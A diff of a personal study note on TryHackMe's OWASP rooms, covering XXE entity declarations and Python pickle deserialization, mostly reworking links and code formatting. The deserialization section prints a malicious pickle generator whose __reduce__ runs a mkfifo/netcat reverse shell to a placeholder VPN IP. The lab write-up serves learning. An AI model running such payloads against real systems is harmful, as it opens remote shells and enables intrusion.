@@ -4,7 +4,7 @@
 
 ### (Severity 04) XML External Entity
 
-As with [injection attacks](2021-10-05-tryhackme-complete-beginner.md), XML external entity (XXE) attacks are broken down into two types: in-band (analogous us to active injection attacks) and out-of-band (OOB-XXE or “blind” XXE, which are of course analogous to blind injection attacks).
+As with injection attacks, XML external entity (XXE) attacks are broken down into two types: in-band (analogous us to active injection attacks) and out-of-band (OOB-XXE or “blind” XXE, which are of course analogous to blind injection attacks).
 
 The encoding/version bit of an XML document is called the “prolog”.
 
@@ -45,7 +45,7 @@ There are three basic important XML bits here:
 
 * `!DOCTYPE` defines the document type *and* the root element.
 * `!ELEMENT` defines additional elements (so if I understand this correctly, a !DOCTYPE declaration must contain at least one !ELEMENT with the same name).
-* `!ENTITY` defines entities like `&gt;` — basically shortcuts for other data. There seems to be a lot more to [XML entities](https://xmlwriter.net/xml_guide/entity_declaration.shtml) than just this though…
+* `!ENTITY` defines entities like `&gt;` — basically shortcuts for other data. There seems to be a lot more to XML entities than just this though…
 
 The SYSTEM keyword can be included in !ENTITY declarations (or in the XML document !DOCTYPE declaration), and means “read this from the current system”.
 
@@ -59,7 +59,7 @@ Basically, you can think of the bit between the brackets (`[]`) in the DTD as ge
 
 This basically strikes me as more-or-less the same thing as an injection attack, just that we’re targeting the XML parser rather than the website code.
 
-[RCE through XEE is apparently rare](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection), but can be achieved via the PHP expect module.
+RCE through XEE is apparently rare, but can be achieved via the PHP expect module.
 
 ```xml
 <?xml version="1.0"?>
@@ -68,6 +68,10 @@ This basically strikes me as more-or-less the same thing as an injection attack,
 ```
 
 It looks like this is something that would be more commonly attacked over an API than directly through a web front-end.
+
+* [2021-10-05 TryHackMe: Complete Beginner](2021-10-05-tryhackme-complete-beginner.md)
+* [ENTITY Declaration](https://xmlwriter.net/xml_guide/entity_declaration.shtml)
+* [Exploitation: XML External Entity (XXE) Injection](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection)
 
 ### (Severity 06) Security Misconfiguration
 
@@ -97,23 +101,29 @@ So what’s the difference between this and injection? (As far as I can tell) In
 
 Where the name of this vulnerability starts to make more sense is when the application is encoding (serializing) objects or other data structures, storing them on the user side, and then decoding (deserializing) the structure at a later time and using / trusting it without further checks.
 
-In the TryHackMe example we’re attacking the Python pickle.loads() operation, which reconstructs objects from an encoded data stream. When an object is reconstructed it is actually fully initialized, which means that things like [`object.__reduce__()`](https://docs.python.org/3/library/pickle.html#object.__reduce__) are run.
+In the TryHackMe example we’re attacking the Python pickle.loads() operation, which reconstructs objects from an encoded data stream. When an object is reconstructed it is actually fully initialized, which means that things like `object.__reduce__()` are run.
 
 [This post is much clearer than TryHackMe when it comes to explaining how we’re attacking pickle.loads().](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
 
 Anyways, the TryHackMe room has us use the following code to create a malicious base64 encoded object to feed pickle.loads() (YOUR_TRYHACKME_VPN_IP gets replaced by your VPN IP):
 
 ```python
-import pickle		
-import sys		
-import base64		
+#!/usr/bin/env python
 
-command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'		
+import pickle
+import sys
+import base64
 
-class rce(object):		
-    def __reduce__(self):		
-        import os		
-        return (os.system,(command,))		
+command =  'rm /tmp/f; '
+command += 'mkfifo /tmp/f; '
+command += 'cat /tmp/f | '
+command += '/bin/sh -i 2>&1 | '
+command += 'netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'
+
+class rce(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(command,))
 
 print(base64.b64encode(pickle.dumps(rce())))
 ```
@@ -121,6 +131,8 @@ print(base64.b64encode(pickle.dumps(rce())))
 What’s getting encoded here is the `rce` class. Python will call `rce.__reduce__()` to determine how to initialize this class when pickle.loads() deserializes it, and `__reduce__()` wil return the tuple `(os.system, (command,))`, where `command` is basically our standard Metasploit reverse shell. Python then initializes the class by using os.system to call `command`, and there’s our reverse shell!
 
 (SIDE NOTE: Isn’t `nc` a more common name for `netcat`? Debian provides links to both in /etc/aleternatives, but it seems best not to assume we’re on a Debian system…)
+
+* [pickle — Python object serialization](https://docs.python.org/3/library/pickle.html)
 
 - - - -
 
